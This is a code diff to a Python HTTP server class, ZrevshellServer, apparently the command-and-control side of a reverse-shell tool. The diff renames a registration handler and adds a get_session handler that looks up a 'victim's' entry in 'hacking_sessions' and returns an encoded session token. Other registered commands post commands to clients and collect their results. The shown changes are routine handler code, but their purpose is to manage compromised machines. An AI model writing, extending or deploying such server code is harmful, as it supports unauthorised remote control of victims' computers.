@@ -36,12 +36,16 @@ class ZrevshellServer(BaseHTTPRequestHandler):
             str, list[HTTPMethod | Callable[..., Any]]
         ] = {
             ut.ServerCommands.post_cmd: [self.handle_cmd_post_cmd, HTTPMethod.POST],
-            ut.ServerCommands.register: [self.handle_cmd_verify, HTTPMethod.POST],
+            ut.ServerCommands.register: [self.handle_cmd_register, HTTPMethod.POST],
             ut.ServerCommands.create_session: [
                 self.handle_cmd_create_session,
                 HTTPMethod.POST,
             ],
             ut.ServerCommands.post_res: [self.handle_cmd_post_res, HTTPMethod.GET],
+            ut.ServerCommands.get_session: [
+                self.handle_cmd_get_session,
+                HTTPMethod.GET,
+            ],
             ut.ServerCommands.fetch_cmd: [
                 lambda: (False, HTTPStatus.NOT_IMPLEMENTED),
                 HTTPMethod.GET,
@@ -189,7 +193,9 @@ class ZrevshellServer(BaseHTTPRequestHandler):
 
     # ---------- Server command handler methods ---------- #
 
-    def handle_cmd_verify(self, client_id: str, client_type: int, req_body: str | None):
+    def handle_cmd_register(
+        self, client_id: str, client_type: int, req_body: str | None
+    ):
         """Do what needs to be done if the server command sent is 'verify'."""
         # First let's check if the user is already in the database
         result = self.database.query(
@@ -220,6 +226,23 @@ class ZrevshellServer(BaseHTTPRequestHandler):
 
         # If all is good return OK
         return sh.HandlerResponse(True, HTTPStatus.OK)
+
+    def handle_cmd_get_session(
+        self, client_id: str, client_type: int, req_body: str | None
+    ):
+        """Handle the get_session command"""
+
+        session_id = self.hacking_sessions.get_session_id(client_id)
+
+        if session_id is None:
+            # This means the victim is not in a session.
+            return sh.HandlerResponse(False, HTTPStatus.NOT_FOUND)
+
+        session_id = ut.encode_token(session_id).encode()
+
+        return sh.HandlerResponse(
+            True, HTTPStatus.OK, session_id, {"content-length": str(len(session_id))}
+        )
 
     def handle_cmd_post_res(
         self, client_id: str, client_type: int, req_body: str | None
@@ -464,7 +487,9 @@ class ZrevshellServer(BaseHTTPRequestHandler):
             client_id,
             command,
             handler,
-            get_client_type_from_headers=(True if command == ut.ServerCommands.register else False),
+            get_client_type_from_headers=(
+                True if command == ut.ServerCommands.register else False
+            ),
         )
 
     def do_GET(self):
